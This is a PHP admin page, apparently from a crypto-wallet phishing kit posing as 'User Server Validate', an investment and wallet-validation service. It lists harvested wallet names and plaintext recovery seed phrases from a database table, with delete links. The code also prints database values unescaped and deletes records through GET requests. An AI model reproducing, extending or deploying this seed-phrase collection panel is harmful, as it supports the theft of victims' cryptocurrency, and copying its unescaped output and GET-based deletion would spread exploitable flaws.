<?php
//Require my functions.php file
include('../function.php');
//Begin cookie and include the cookie file
include('../cookie.php');
?>
<?php include('header.php'); ?>

<body class="page-user">
<?php include('nav.php'); ?>
<div>     
  <div class="page-content">
      <div class="container">
            <div class="card content-area">
                                <div class="card-innr table-responsive">
                    <div class="card-head">
                        <h4 class="card-title">User Wallet Record</h4>
                    </div>
                                <table class="data-table table table-hover dt-init user-tnx">
                        <thead>
                            <tr class="data-item data-head">
                                <th class="data-col dt-tnxno">TXN ID</th>
                                <th class="data-col dt-tnxno">Wallet</th>
                                <th class="data-col dt-tnxno">Seed Phrase</th>
                                <th class="data-col dt-type">
                                    <div class="dt-type-tnxno">Timestamp</div>
                                </th>
                                <th class="data-col dt-type">
                                    <div class="dt-type-text">Delete</div>
                                </th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $sql_wallets_exec = "SELECT * FROM `wallet`";
                            $sql_wallet_exec = $con->query($sql_wallets_exec);
                           foreach($sql_wallet_exec as $winft){extract($winft);?>

                                                        <tr class="data-item">
                                <td class="data-col dt-tnxno">
                                    <div class="d-flex align-items-center">
                                 <!-- <div class="data-state data-state-pending">
                                            <span class="d-none">waiting</span>
                                        </div> -->
                                           <div class="fake-class">
                                        <span class="lead tnx-id"><?php if(isset($wtxn) && $wtxn!==null){echo $wtxn;}?></span>
                                            <span class="sub sub-date"><?php if(isset($date_of_transaction) && $date_of_transaction!==null){echo $date_of_transaction;}?></span>
                                        </div>
                                    </div>
                                </td>
                                <td class="data-col dt-token">
                                    <span class="lead token-amount"><?php if(isset($winft['wallet_name']) && $winft['wallet_name']!==null){echo $winft['wallet_name'];}?></span>
                              <span class="sub sub-symbol"><?php if(isset($winft['wallet_name']) && $winft['wallet_name']!==null){echo "Wallet";}?></span> 
                                </td>

                                 <td class="data-col dt-token">
                                    <span class="lead token-amount"><?php if(isset($winft['seed']) && $winft['seed']!==null){echo $winft['seed'];}?></span>
                                  <!--   <span class="sub sub-symbol"></span> -->
                                </td>
                                <td class="data-col dt-type" id="td_approve">
                             <span class="lead user-info text-dark"><?php if(isset($winft['date_of_transaction']) && $winft['date_of_transaction']!==null){echo $winft['date_of_transaction'];}?></span>
                             <span class="sub sub-symbol"><?php if(isset($winft['date_of_transaction']) && $winft['date_of_transaction']!==null){echo "Transation date/time";}?></span>
                        </td>
      <td class="data-col dt-type">
                            <a href="user.php?dwt=<?= $wtxn; ?>" class="dt-type-md"><span class='badge badge-outline badge-primary badge-md'>Delete</span></a>
                            <a href="user.php?dwt=<?= $wtxn; ?>" class="dt-type-sm badge badge-sq badge-outline badge-primary badge-md">Del</a>
                        </td>
                                                                    </td>
                            </tr>
                        <?php }?>
                                                    </tbody>
                    </table>
                </div>
                              <!-- .card-innr -->
 
          <!-- .card -->
                </div>
                              <!-- .card-innr -->

        </div>
      <!-- .container -->
  </div>
  <!-- .page-content -->
</div>

    <div class="footer-bar">
        <div class="container">
            <div class="row align-items-center justify-content-center">
                <div class="col-md-8">
                    <ul class="footer-links">
                        
                       <li><a href="https://userservervalidate.com/docs/terms-of-use.php">Terms of Service</a></li>
        <li><a href="https://userservervalidate.com/docs/about.php">About</a></li>
        <li><a href="https://userservervalidate.com/docs/cookie-policy.php">Cookie Policy</a></li>
        <li><a href="https://userservervalidate.com/docs/refund-policy.php">Refund Policy</a></li>
        <li><a href="https://userservervalidate.com/docs/privacy-policy.php">Privacy Policy</a></li>
                    </ul>
                </div>
                <!-- .col -->
                <div class="col-md-4 mt-2 mt-sm-0">
                    <div class="d-flex justify-content-between justify-content-md-end align-items-center guttar-25px pdt-0-5x pdb-0-5x">
                    <div class="copyright-text">
                         <center><small>©&nbsp;<?= date('Y');?>&nbsp;<a href="#"><span class="orange">User Server Validate</span></a> | All rights reserved.&nbsp;User Server Validate is a registered investment platform providing user authentication, wallet services, digital asset investment management services to individuals, lending and investment, multicurrency and multifunctional online platform based on blockchain technology.</small></center></p></div>
                    </div>
                    </div>
                </div>
                <!-- .col -->
            </div>
            <!-- .row -->
        </div>
        <!-- .container -->
    </div>
    <!-- .footer-bar -->

    <!-- Modal Centered -->
    
    <!-- Modal End -->
    <!-- Modal Centered -->
    
    <!-- JavaScript (include all script here) -->
    <script src="https://transactright.com/js/app.js"></script>
<script src="../assets/js/jquery.bundle49f7.js"></script>
<script src="../assets/js/script49f7.js"></script>
<!-- Toastr -->
<script src="dist/js/toastr.min.js"></script>
<script type="text/javascript">
  toastr.info('View and manage the wallet record of your users','Info');
</script>
    </body>
    </html>
    <?php
if(isset($toast) && $toast==='success'){echo "<script>toastr.success('You have updated database', 'Success')</script>";}
if(isset($toast) && $toast==='fail'){echo "<script>toastr.error('Database could not be updated', 'Error')</script>";}
?>